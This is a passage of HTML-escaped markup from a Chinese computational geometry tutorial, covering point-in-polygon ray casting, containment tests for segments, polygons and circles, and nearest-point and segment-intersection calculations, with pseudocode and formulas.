lang=&quot;EN-US&quot;&gt;(b)&lt;/span&gt;中，&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;和多边形顶点的交点不应被计算；在图&lt;span lang=&quot;EN-US&quot;&gt;(c)&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;(d) &lt;/span&gt;中，&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;和多边形的一条边重合，这条边应该被忽略不计。如果&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;和多边形的一条边重合，这条边应该被忽略不计。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;img src=&quot;file:///C:/DOCUME%7E1/ADMINI%7E1/LOCALS%7E1/Temp/msohtml1/01/clip_image001.gif&quot; height=&quot;32&quot; width=&quot;32&quot; /&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　为了统一起见，我们在计算射线&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;和多边形的交点的时候，&lt;span lang=&quot;EN-US&quot;&gt;1&lt;/span&gt;。对于多边形的水平边不作考 虑；&lt;span lang=&quot;EN-US&quot;&gt;2&lt;/span&gt;。对于多边形的顶点和&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;相交的情况，如果该顶点是其所属的边上纵坐标较大的顶点，则计数，否则忽略；&lt;span lang=&quot;EN-US&quot;&gt;3&lt;/span&gt;。对于&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;在多边形边上的情形，直接可判断&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;属 于多边行。由此得出算法的伪代码如下：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;count ← 0;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;以&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;为端点，作从右向左的射线&lt;span lang=&quot;EN-US&quot;&gt;L; &lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;for &lt;/span&gt;多边形的每条边&lt;span lang=&quot;EN-US&quot;&gt;s&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;do if P&lt;/span&gt;在边&lt;span lang=&quot;EN-US&quot;&gt;s&lt;/span&gt;上&lt;span lang=&quot;EN-US&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;then return true;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;if s&lt;/span&gt;不是水平的&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;then if s&lt;/span&gt;的一个端点在&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;上&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;if &lt;/span&gt;该端点是&lt;span lang=&quot;EN-US&quot;&gt;s&lt;/span&gt;两端点中纵坐标较大的端点&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;then count ← count+1&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;else if s&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;相交&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;then count ← count+1;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;if count mod 2 = 1 &lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;then return true;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;else return false;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　其中做射线&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;的方法是：设&lt;span lang=&quot;EN-US&quot;&gt;P''&lt;/span&gt;的纵坐标和&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;相同，横坐标为正无穷大（很大的一个正数），则&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;P''&lt;/span&gt;就确定了射线&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　判断点是否在多边形中的这个算法的时间复杂度为&lt;span lang=&quot;EN-US&quot;&gt;O(n)&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　另外还有一种算法是用带符号的三角形面积之和与多边形面积进行比较，这种算法由于使用浮点数运算所以会带来一定误差，不推荐大家使用。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　&lt;span style=&quot;color:#074483;&quot;&gt;判断线段是否在多边形内&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　线段在多边形内的一个必要条件是线段的两个端点都在多边形内，但由于多边形可能为凹，所 以这不能成为判断的充分条件。如果线段和多边形的某条边内交（两线段内交是指两线段相交且交点不在两线段的端点），因为多边形的边的左右两侧分属多边形内外不同部分，所以线段一定会有一部分在多边形外&lt;span lang=&quot;EN-US&quot;&gt;(&lt;/span&gt;见图&lt;span lang=&quot;EN-US&quot;&gt;a)&lt;/span&gt;。于是我们得到线段在多边形内的第二个必要条件：线段和多边形的所有边都不内交。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　线段和多边形交于线段的两端点并不会影响线段是否在多边形内；但是如果多边形的某个顶点和线段相交，还必须判断两相邻交点之间的线段是否包含于多边形内部（反例见图&lt;span lang=&quot;EN-US&quot;&gt;b)&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;img src=&quot;file:///C:/DOCUME%7E1/ADMINI%7E1/LOCALS%7E1/Temp/msohtml1/01/clip_image001.gif&quot; height=&quot;32&quot; width=&quot;32&quot; /&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　因此我们可以先求出所有和线段相交的多边形的顶点，然后按照&lt;span lang=&quot;EN-US&quot;&gt;X-Y&lt;/span&gt;坐标排序&lt;span lang=&quot;EN-US&quot;&gt;(X&lt;/span&gt;坐标小的 排在前面，对于&lt;span lang=&quot;EN-US&quot;&gt;X&lt;/span&gt;坐标相同的点，&lt;span lang=&quot;EN-US&quot;&gt;Y&lt;/span&gt;坐标小的排在前面，这种排序准则也是为了保证水平和垂直情况的判断正确&lt;span lang=&quot;EN-US&quot;&gt;)&lt;/span&gt;，这样相邻的两个点就是在线段上相邻的两交点，如果任意相邻两点的中点也在多边形内，则该线段一定在多边形内。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　证明如下：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　命题&lt;span lang=&quot;EN-US&quot;&gt;1&lt;/span&gt;：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　　　如果线段和多边形的两相邻交点&lt;span lang=&quot;EN-US&quot;&gt;P1 &lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;P2&lt;/span&gt;的中点&lt;span lang=&quot;EN-US&quot;&gt;P'' &lt;/span&gt;也在多边形内，则&lt;span lang=&quot;EN-US&quot;&gt;P1,P2&lt;/span&gt;之间的所有点都在多边形内。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　证明：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　　　假设&lt;span lang=&quot;EN-US&quot;&gt;P1,P2&lt;/span&gt;之间含有不在多边形内的点，不妨设该点为&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;，在&lt;span lang=&quot;EN-US&quot;&gt;P1, P''&lt;/span&gt;之间，因为多边形是闭合曲线，所以其内外部之间有界，而&lt;span lang=&quot;EN-US&quot;&gt;P1&lt;/span&gt;属于多边行内部，&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;属于多边性外部，&lt;span lang=&quot;EN-US&quot;&gt;P''&lt;/span&gt;属于多边性内部，&lt;span lang=&quot;EN-US&quot;&gt;P1-Q-P''&lt;/span&gt;完全连续，所以&lt;span lang=&quot;EN-US&quot;&gt; P1Q&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;QP''&lt;/span&gt;一定跨越多边形的边界，因此在&lt;span lang=&quot;EN-US&quot;&gt;P1,P''&lt;/span&gt;之间至少还有两个该线段和多边形的交点，这和&lt;span lang=&quot;EN-US&quot;&gt;P1P2&lt;/span&gt;是相邻两交点矛盾，故命题成立。证毕。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　由命题&lt;span lang=&quot;EN-US&quot;&gt;1&lt;/span&gt;直接可得出推论：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　推论&lt;span lang=&quot;EN-US&quot;&gt;2&lt;/span&gt;：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　　　设多边形和线段&lt;span lang=&quot;EN-US&quot;&gt;PQ&lt;/span&gt;的交点依次为&lt;span lang=&quot;EN-US&quot;&gt;P1,P2,……Pn&lt;/span&gt;，其中&lt;span lang=&quot;EN-US&quot;&gt;Pi&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;Pi+1&lt;/span&gt;是相邻两交点，线段&lt;span lang=&quot;EN-US&quot;&gt;PQ&lt;/span&gt;在多边形内的充要条件是：&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;在多边形内且对于&lt;span lang=&quot;EN-US&quot;&gt;i =1, 2,……, n-1&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;Pi ,Pi+1&lt;/span&gt;的中点也在多边形内。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　在实际编程中，没有必要计算所有的交点，首先应判断线段和多边形的边是否内交，倘若线段和多边形的某条边内交则线段一定在多边形外；如果线段和多边形的每一条边都不内交，则线段和多边形的交点一定是线段的端点或者多边形的顶点，只要判断点是否在线段上就可以了。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　至此我们得出算法如下：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;if &lt;/span&gt;线端&lt;span lang=&quot;EN-US&quot;&gt;PQ&lt;/span&gt;的端点不都在多边形内&lt;span lang=&quot;EN-US&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;then return false;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;点集&lt;span lang=&quot;EN-US&quot;&gt;pointSet&lt;/span&gt;初始化为空&lt;span lang=&quot;EN-US&quot;&gt;;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;for &lt;/span&gt;多边形的每条边&lt;span lang=&quot;EN-US&quot;&gt;s&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;do if &lt;/span&gt;线段的某个端点在&lt;span lang=&quot;EN-US&quot;&gt;s&lt;/span&gt;上&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;then &lt;/span&gt;将该端点加入&lt;span lang=&quot;EN-US&quot;&gt;pointSet;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;else if s&lt;/span&gt;的某个端点在线段&lt;span lang=&quot;EN-US&quot;&gt;PQ&lt;/span&gt;上&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;then &lt;/span&gt;将该端点加入&lt;span lang=&quot;EN-US&quot;&gt;pointSet;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;else if s&lt;/span&gt;和线段&lt;span lang=&quot;EN-US&quot;&gt;PQ&lt;/span&gt;相交&lt;span lang=&quot;EN-US&quot;&gt; // &lt;/span&gt;这时候已经可以肯定是内交了&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;then return false;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;将&lt;span lang=&quot;EN-US&quot;&gt;pointSet&lt;/span&gt;中的点按照&lt;span lang=&quot;EN-US&quot;&gt;X-Y&lt;/span&gt;坐标排序&lt;span lang=&quot;EN-US&quot;&gt;;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;for pointSet&lt;/span&gt;中每两个相邻点&lt;span lang=&quot;EN-US&quot;&gt; pointSet[i] , pointSet[ i+1]&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;do if pointSet[i] , pointSet[i+1] &lt;/span&gt;的中点不在多边形中&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;then return false;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;return true;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　这个过程中的排序因为交点数目肯定远小于多边形的顶点数目&lt;span lang=&quot;EN-US&quot;&gt;n&lt;/span&gt;，所以最多是常数级的复杂度，几乎可以忽略不计。因此算法的时间复杂度也是&lt;span lang=&quot;EN-US&quot;&gt;O(n)&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;color:#074483;&quot;&gt;判断折线是否在多边形内&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　只要判断折线的每条线段是否都在多边形内即可。设折线有&lt;span lang=&quot;EN-US&quot;&gt;m&lt;/span&gt;条线段，多边形有&lt;span lang=&quot;EN-US&quot;&gt;n&lt;/span&gt;个顶点，则该算法的时间复杂度为&lt;span lang=&quot;EN-US&quot;&gt;O(m*n)&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　　&lt;span style=&quot;color:#074483;&quot;&gt;判断多边形是否在多边形内&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　只要判断多边形的每条边是否都在多边形内即可。判断一个有&lt;span lang=&quot;EN-US&quot;&gt;m&lt;/span&gt;个顶点的多边形是否在一个有&lt;span lang=&quot;EN-US&quot;&gt;n&lt;/span&gt;个顶点的多边形内复杂度为&lt;span lang=&quot;EN-US&quot;&gt;O(m*n)&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　&lt;span style=&quot;color:#074483;&quot;&gt;判断矩形是否在多边形内&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　将矩形转化为多边形，然后再判断是否在多边形内。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　　&lt;span style=&quot;color:#074483;&quot;&gt;判断圆是否在多边形内&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　只要计算圆心到多边形的每条边的最短距离，如果该距离大于等于圆半径则该圆在多边形内。计算圆心到多边形每条边最短距离的算法在后文阐述。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　&lt;span style=&quot;color:#074483;&quot;&gt;判断点是否在圆内&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　计算圆心到该点的距离，如果小于等于半径则该点在圆内。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　　&lt;span style=&quot;color:#074483;&quot;&gt;判断线段、折线、矩形、多边形是否在圆内&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　因为圆是凸集，所以只要判断是否每个顶点都在圆内即可。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　&lt;span style=&quot;color:#074483;&quot;&gt;判断圆是否在圆内&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　设两圆为&lt;span lang=&quot;EN-US&quot;&gt;O1,O2&lt;/span&gt;，半径分别为&lt;span lang=&quot;EN-US&quot;&gt;r1, r2&lt;/span&gt;，要判断&lt;span lang=&quot;EN-US&quot;&gt;O2&lt;/span&gt;是否在&lt;span lang=&quot;EN-US&quot;&gt;O1&lt;/span&gt;内。先比较&lt;span lang=&quot;EN-US&quot;&gt;r1&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;r2&lt;/span&gt;的大小，如果&lt;span lang=&quot;EN-US&quot;&gt;r1&amp;lt;r2&lt;/span&gt;则&lt;span lang=&quot;EN-US&quot;&gt;O2&lt;/span&gt;不可能在&lt;span lang=&quot;EN-US&quot;&gt;O1&lt;/span&gt;内；否则如果两圆心的距离大于&lt;span lang=&quot;EN-US&quot;&gt;r1 - r2 &lt;/span&gt;，则&lt;span lang=&quot;EN-US&quot;&gt;O2&lt;/span&gt;不在&lt;span lang=&quot;EN-US&quot;&gt;O1&lt;/span&gt;内；否则&lt;span lang=&quot;EN-US&quot;&gt;O2&lt;/span&gt;在&lt;span lang=&quot;EN-US&quot;&gt;O1&lt;/span&gt;内。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　&lt;span style=&quot;color:#074483;&quot;&gt;计算点到线段的最近点&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　如果该线段平行于&lt;span lang=&quot;EN-US&quot;&gt;X&lt;/span&gt;轴（&lt;span lang=&quot;EN-US&quot;&gt;Y&lt;/span&gt;轴），则过点&lt;span lang=&quot;EN-US&quot;&gt;point&lt;/span&gt;作该线段所在直线的垂线，垂足很容易求 得，然后计算出垂足，如果垂足在线段上则返回垂足，否则返回离垂足近的端点；如果该线段不平行于&lt;span lang=&quot;EN-US&quot;&gt;X&lt;/span&gt;轴也不平行于&lt;span lang=&quot;EN-US&quot;&gt;Y&lt;/span&gt;轴，则斜率存在且不为&lt;span lang=&quot;EN-US&quot;&gt;0&lt;/span&gt;。设线段的两端点为&lt;span lang=&quot;EN-US&quot;&gt;pt1&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;pt2&lt;/span&gt;，斜率为：&lt;span lang=&quot;EN-US&quot;&gt;k= ( pt2.y - pt1. y ) / (pt2.x - pt1.x );&lt;/span&gt;该直线方程为：&lt;span lang=&quot;EN-US&quot;&gt;y = k* (x - pt1.x) + pt1.y&lt;/span&gt;。其垂线的斜率为&lt;span lang=&quot;EN-US&quot;&gt; - 1 / k&lt;/span&gt;，垂线方程为：&lt;span lang=&quot;EN-US&quot;&gt;y = (-1/k) * (x - point.x) + point.y &lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　联立两直线方程解得：&lt;span lang=&quot;EN-US&quot;&gt;x = ( k^2 * pt1.x +k * (point.y - pt1.y ) + point.x ) / ( k^2 + 1) &lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;y = k* ( x - pt1.x) + pt1.y;&lt;/span&gt;然后再判断垂足是否在线段上，如果在线段上则返回垂足；如果不在则计算两端点到垂足的距离，选择距离垂足较近的端点返回。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　　&lt;span style=&quot;color:#074483;&quot;&gt;计算点到折线、矩形、多边形的最近点&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　只要分别计算点到每条线段的最近点，记录最近距离，取其中最近距离最小的点即可。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　&lt;span style=&quot;color:#074483;&quot;&gt;计算点到圆的最近距离及交点坐标&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　如果该点在圆心，因为圆心到圆周任一点的距离相等，返回&lt;span lang=&quot;EN-US&quot;&gt;UNDEFINED&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　连接点&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;和圆心&lt;span lang=&quot;EN-US&quot;&gt;O&lt;/span&gt;，如果&lt;span lang=&quot;EN-US&quot;&gt;PO&lt;/span&gt;平行于&lt;span lang=&quot;EN-US&quot;&gt;X&lt;/span&gt;轴，则根据&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;在&lt;span lang=&quot;EN-US&quot;&gt;O&lt;/span&gt;的左边还是右边计算出最近点的横坐 标为&lt;span lang=&quot;EN-US&quot;&gt;centerPoint.x - radius &lt;/span&gt;或&lt;span lang=&quot;EN-US&quot;&gt; centerPoint.x +radius&lt;/span&gt;。如果&lt;span lang=&quot;EN-US&quot;&gt;PO&lt;/span&gt;平行于&lt;span lang=&quot;EN-US&quot;&gt;Y&lt;/span&gt;轴，则根据&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;在&lt;span lang=&quot;EN-US&quot;&gt;O&lt;/span&gt;的上边还是下边计算出最近点的纵坐标为&lt;span lang=&quot;EN-US&quot;&gt; centerPoint.y -+radius&lt;/span&gt;或&lt;span lang=&quot;EN-US&quot;&gt; centerPoint.y -radius&lt;/span&gt;。如果&lt;span lang=&quot;EN-US&quot;&gt;PO&lt;/span&gt;不平行于&lt;span lang=&quot;EN-US&quot;&gt;X&lt;/span&gt;轴和&lt;span lang=&quot;EN-US&quot;&gt;Y&lt;/span&gt;轴，则&lt;span lang=&quot;EN-US&quot;&gt;PO&lt;/span&gt;的斜率存在且不为&lt;span lang=&quot;EN-US&quot;&gt;0&lt;/span&gt;，这时直线&lt;span lang=&quot;EN-US&quot;&gt;PO&lt;/span&gt;斜率为&lt;span lang=&quot;EN-US&quot;&gt;k = &lt;/span&gt;（&lt;span lang=&quot;EN-US&quot;&gt; P.y - O.y&lt;/span&gt;）&lt;span lang=&quot;EN-US&quot;&gt;/ ( P.x - O.x )&lt;/span&gt;。直线&lt;span lang=&quot;EN-US&quot;&gt;PO&lt;/span&gt;的方程为：&lt;span lang=&quot;EN-US&quot;&gt;y = k * ( x - P.x) + P.y&lt;/span&gt;。设圆方程为&lt;span lang=&quot;EN-US&quot;&gt;:(x - O.x ) ^2+ ( y - O.y ) ^2 = r ^2&lt;/span&gt;，联立两方程组可以解出直线&lt;span lang=&quot;EN-US&quot;&gt;PO&lt;/span&gt;和圆的交点，取其中离&lt;span lang=&quot;EN-US&quot;&gt;P&lt;/span&gt;点较近的交点即可。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　&lt;span style=&quot;color:#074483;&quot;&gt;计算两条共线的线段的交点&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　对于两条共线的线段，它们之间的位置关系有下图所示的几种情况。图&lt;span lang=&quot;EN-US&quot;&gt;(a)&lt;/span&gt;中两条线段没有 交点；图&lt;span lang=&quot;EN-US&quot;&gt; (b) &lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt; (d) &lt;/span&gt;中两条线段有无穷焦点；图&lt;span lang=&quot;EN-US&quot;&gt; (c) &lt;/span&gt;中两条线段有一个交点。设&lt;span lang=&quot;EN-US&quot;&gt;line1&lt;/span&gt;是两条线段中较长的一条，&lt;span lang=&quot;EN-US&quot;&gt;line2&lt;/span&gt;是较短的一条，如果&lt;span lang=&quot;EN-US&quot;&gt;line1&lt;/span&gt;包含了&lt;span lang=&quot;EN-US&quot;&gt;line2&lt;/span&gt;的两个端点，则是图&lt;span lang=&quot;EN-US&quot;&gt;(d)&lt;/span&gt;的情况， 两线段有无穷交点；如果&lt;span lang=&quot;EN-US&quot;&gt;line1&lt;/span&gt;只包含&lt;span lang=&quot;EN-US&quot;&gt;line2&lt;/span&gt;的一个端点，那么如果&lt;span lang=&quot;EN-US&quot;&gt;line1&lt;/span&gt;的某个端点等于被&lt;span lang=&quot;EN-US&quot;&gt;line1&lt;/span&gt;包含的&lt;span lang=&quot;EN-US&quot;&gt;line2&lt;/span&gt;的那个端点，则是图&lt;span lang=&quot;EN-US&quot;&gt;(c) &lt;/span&gt;的情况，这时两线段只有一个交点，否则就是图&lt;span lang=&quot;EN-US&quot;&gt;(b)&lt;/span&gt;的情况，两线段也是有无穷的交点；如果&lt;span lang=&quot;EN-US&quot;&gt;line1&lt;/span&gt;不包含&lt;span lang=&quot;EN-US&quot;&gt;line2&lt;/span&gt;的任何端点，则是图&lt;span lang=&quot;EN-US&quot;&gt;(a)&lt;/span&gt;的情况，这 时两线段没有交点。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;color:#074483;&quot;&gt;计算线段或直线与线段的交点&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot; lang=&quot;EN-US&quot;&gt;:&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　设一条线段为&lt;span lang=&quot;EN-US&quot;&gt;L0 = P1P2&lt;/span&gt;，另一条线段或直线为&lt;span lang=&quot;EN-US&quot;&gt;L1 = Q1Q2 &lt;/span&gt;，要计算的就是&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;的交点。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;span lang=&quot;EN-US&quot;&gt;1&lt;/span&gt;．首先判断&lt;span 